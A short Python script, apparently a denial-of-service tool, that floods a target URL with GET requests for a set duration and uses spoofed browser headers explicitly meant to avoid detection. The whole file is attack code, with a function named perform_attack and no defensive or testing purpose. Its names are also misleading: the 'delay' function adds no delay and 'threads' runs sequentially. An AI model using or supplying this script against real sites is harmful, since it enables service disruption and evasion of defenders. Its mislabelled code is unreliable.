import requests
import random
import time

# Generate headers to simulate normal traffic and avoid detection
def generate_headers():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    ]
    return {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'User-Agent': random.choice(user_agents),
    }

# Function to simulate GET requests with headers and random delays
def send_get_request_with_delay(url):
    headers = generate_headers()
    try:
        response = requests.get(url, headers=headers, timeout=5)
        print(f"Request to {url} status: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error with {url}: {str(e)}")

# Function to simulate attack
def perform_attack(url, duration, threads):
    start_time = time.time()
    while time.time() - start_time < duration:
        for _ in range(threads):
            send_get_request_with_delay(url)
